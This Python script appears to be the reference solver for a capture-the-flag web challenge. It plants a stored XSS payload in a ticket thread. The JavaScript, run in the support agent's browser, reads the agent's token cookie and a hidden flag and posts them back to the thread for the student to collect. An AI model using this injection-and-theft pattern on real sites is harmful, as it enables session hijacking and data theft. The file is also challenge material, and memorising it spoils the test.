#!/usr/bin/env python3
"""Open Ticket solver: store a message, let the agent open it, read the thread."""

from __future__ import annotations

import argparse
import http.cookiejar
import re
import sys
import urllib.error
import urllib.parse
import urllib.request

STUDENT_USERNAME = "student"

TICKET_ID = 1

FLAG = re.compile(r"ingehack\{[^}\r\n]+\}")

# Runs in the agent's browser when she opens the thread. The page keeps the
# ticket token in a cookie the page can read, and shows the flag to the agent.
PAYLOAD = (
    "<script>"
    "(function(){"
    "var row=document.cookie.split('; ').find(function(c){return c.indexOf('agent_token=')===0;});"
    "var token=row?row.split('=')[1]:'';"
    "var note=document.getElementById('agent-flag');"
    "var flag=note?note.textContent.trim():'';"
    "fetch('/api/tickets/1/append',{method:'POST',"
    "headers:{'Content-Type':'application/x-www-form-urlencoded','X-Agent-Token':token},"
    "body:'body='+encodeURIComponent(flag)});"
    "})();"
    "</script>"
)


class SolverError(RuntimeError):
    """The intended path did not produce a flag."""


def sign_in(base_url: str) -> urllib.request.OpenerDirector:
    """Sign in as the player and return the opener that keeps the session cookie."""
    jar = http.cookiejar.CookieJar()
    opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(jar))
    try:
        with opener.open(base_url + "/login", timeout=10) as response:
            page = response.read().decode("utf-8", "replace")
        match = re.search(r'data-pin-for="student">([^<]+)</code>', page)
        if not match:
            raise SolverError("the login page did not carry the student pass")
        body = urllib.parse.urlencode(
            {"username": STUDENT_USERNAME, "password": match.group(1)}
        ).encode()
        opener.open(base_url + "/login", body, timeout=10)
        with opener.open(base_url + f"/tickets/{TICKET_ID}", timeout=10) as response:
            if response.geturl().endswith("/login"):
                raise SolverError("signing in as the student did not create a session")
    except urllib.error.URLError as error:
        raise SolverError(f"cannot sign in at {base_url}: {error}") from error
    return opener


def prepare(base_url: str) -> None:
    opener = sign_in(base_url)
    body = urllib.parse.urlencode({"body": PAYLOAD}).encode()
    try:
        with opener.open(base_url + f"/tickets/{TICKET_ID}", body, timeout=10) as response:
            if response.status != 200:
                raise SolverError("the thread did not accept the message")
    except urllib.error.URLError as error:
        raise SolverError(f"cannot write to the thread: {error}") from error
    print(base_url + f"/agent/tickets/{TICKET_ID}")


def submit(base_url: str) -> None:
    opener = sign_in(base_url)
    try:
        with opener.open(base_url + f"/tickets/{TICKET_ID}", timeout=10) as response:
            body = response.read().decode("utf-8", "replace")
    except urllib.error.URLError as error:
        raise SolverError(f"cannot read the thread: {error}") from error
    match = FLAG.search(body)
    if not match:
        raise SolverError("the flag is not in the thread yet")
    print(match.group(0))


def main() -> int:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--base-url", required=True)
    parser.add_argument("--stage", choices=("prepare", "submit"))
    args = parser.parse_args()

    base_url = args.base_url.rstrip("/")
    try:
        if args.stage == "prepare":
            prepare(base_url)
        elif args.stage == "submit":
            submit(base_url)
        else:
            print("solver: pass --stage prepare or --stage submit", file=sys.stderr)
            return 2
    except SolverError as error:
        print(f"solver: {error}", file=sys.stderr)
        return 1
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
